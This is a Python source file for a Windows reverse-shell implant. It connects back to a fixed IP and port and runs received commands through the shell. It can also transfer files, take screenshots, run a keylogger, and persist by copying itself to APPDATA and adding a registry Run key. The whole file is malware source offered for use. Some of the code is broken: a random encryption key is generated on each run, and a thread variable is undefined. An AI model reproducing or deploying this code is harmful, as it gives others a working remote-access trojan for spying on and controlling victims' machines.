import socket
import json
import subprocess
import time
import os
import pyautogui
import inpc
import threading
import shutil
import sys
import logging
from cryptography.fernet import Fernet
from tqdm import tqdm

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class ReverseShell:
    def __init__(self, server_address=('192.168.17.130', 5555)):
        self.server_address = server_address
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)

    def reliable_send(self, data):
        encrypted_data = self.cipher_suite.encrypt(json.dumps(data).encode())
        self.s.sendall(encrypted_data)

    def reliable_recv(self):
        data = b''
        while True:
            try:
                chunk = self.s.recv(1024)
                if not chunk:
                    raise Exception("Connection closed unexpectedly")
                data += chunk
                if len(chunk) < 1024:
                    break
            except Exception as e:
                logging.error(f"Error receiving data: {e}")
                return None
        return json.loads(self.cipher_suite.decrypt(data))

    def download_file(self, file_path):
        try:
            file_size = int(self.reliable_recv())  # Receive file size first
            with open(file_path, 'wb') as f:
                total_received = 0
                with tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Downloading {os.path.basename(file_path)}") as pbar:
                    while True:
                        chunk = self.s.recv(4096)
                        if not chunk:
                            break
                        f.write(chunk)
                        total_received += len(chunk)
                        pbar.update(len(chunk))
                        if total_received >= file_size:
                            break
            logging.info(f"File downloaded successfully: {file_path}")
        except Exception as e:
            logging.error(f"Error downloading file: {e}")

    def upload_file(self, file_path):
        try:
            file_size = os.path.getsize(file_path)
            self.reliable_send(file_size)
            with open(file_path, 'rb') as f:
                total_sent = 0
                with tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Uploading {os.path.basename(file_path)}") as pbar:
                    while True:
                        chunk = f.read(4096)
                        if not chunk:
                            break
                        self.s.sendall(chunk)
                        total_sent += len(chunk)
                        pbar.update(len(chunk))
            logging.info(f"File uploaded successfully: {file_path}")
        except Exception as e:
            logging.error(f"Error uploading file: {e}")

    def screenshot(self):
        try:
            image_size = pyautogui.size()
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save('screen.png')
            self.upload_file('screen.png')
            os.remove('screen.png')
            logging.info("Screenshot sent successfully")
        except Exception as e:
            logging.error(f"Error taking screenshot: {e}")

    def persist(self, reg_name, copy_name):
        try:
            file_location = os.environ['appdata'] + '\\' + copy_name
            if not os.path.exists(file_location):
                shutil.copyfile(sys.executable, file_location)
                subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', reg_name, '/t', 'REG_SZ', '/d', file_location], check=True)
                self.reliable_send(f'[+] Created Persistence With Reg Key: {reg_name}')
            else:
                self.reliable_send('[+] Persistence Already Exists')
        except Exception as e:
            logging.error(f"Error creating persistence: {e}")
            self.reliable_send(f'[+] Error Creating Persistence With The Target Machine: {str(e)}')

    def connect_to_server(self):
        while True:
            try:
                self.s.connect(self.server_address)
                logging.info(f"Connected to server at {self.server_address}")
                self.shell()
                self.s.close()
                break
            except Exception as e:
                logging.error(f"Connection error: {e}")
                time.sleep(20)

    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
        except Exception as e:
            logging.error(f"Error executing command: {e}")
            return f"Error executing command: {str(e)}"

    def handle_keylogger(self, action):
        try:
            keylog = inpc.Keylogger()
            if action == 'start':
                t = threading.Thread(target=keylog.start)
                t.start()
                self.reliable_send('[+] Keylogger Started!')
            elif action == 'dump':
                logs = keylog.read_logs()
                self.reliable_send(logs)
            elif action == 'stop':
                keylog.self_destruct()
                t.join()
                self.reliable_send('[+] Keylogger Stopped!')
        except Exception as e:
            logging.error(f"Keylogger error: {e}")
            self.reliable_send(f'[+] Error with keylogger: {str(e)}')

    def shell(self):
        while True:
            try:
                command = self.reliable_recv()
                if command == 'quit':
                    break
                elif command == 'background':
                    pass
                elif command == 'help':
                    self.help()
                elif command == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                elif command.startswith('cd'):
                    os.chdir(command[3:])
                elif command.startswith('upload'):
                    self.upload_file(command.split(' ', 1)[1])
                elif command.startswith('download'):
                    self.download_file(command.split(' ', 1)[1])
                elif command.startswith('screenshot'):
                    self.screenshot()
                elif command.startswith('keylog_'):
                    self.handle_keylogger(command.split('_')[1])
                elif command.startswith('persistence'):
                    reg_name, copy_name = command.split(' ')[1:]
                    self.persist(reg_name, copy_name)
                elif command.startswith('sendall'):
                    result = self.execute_command(command.split(' ', 1)[1])
                    self.reliable_send(result)
                else:
                    result = self.execute_command(command)
                    self.reliable_send(result)
            except Exception as e:
                logging.error(f"Error in main loop: {e}")

    def help(self):
        commands = {
            'quit': 'Quit the shell',
            'background': 'Run the shell in the background',
            'help': 'Show this help information',
            'clear': 'Clear the terminal screen',
            'cd': 'Change directory',
            'upload': 'Upload a file',
            'download': 'Download a file',
            'screenshot': 'Take a screenshot',
            'keylog_start': 'Start keylogger',
            'keylog_dump': 'Dump keylogger logs',
            'keylog_stop': 'Stop keylogger',
            'persistence': 'Create persistence',
            'sendall': 'Send a command to all connected clients',
        }
        result = '\n'.join(f"{cmd}: {desc}" for cmd, desc in commands.items())
        self.reliable_send(result)

    def run(self):
        try:
            self.connect_to_server()
        except KeyboardInterrupt:
            logging.info("Reverse shell interrupted by user")
        finally:
            if self.s:
                self.s.close()

if __name__ == "__main__":
    reverse_shell = ReverseShell()
    reverse_shell.run()
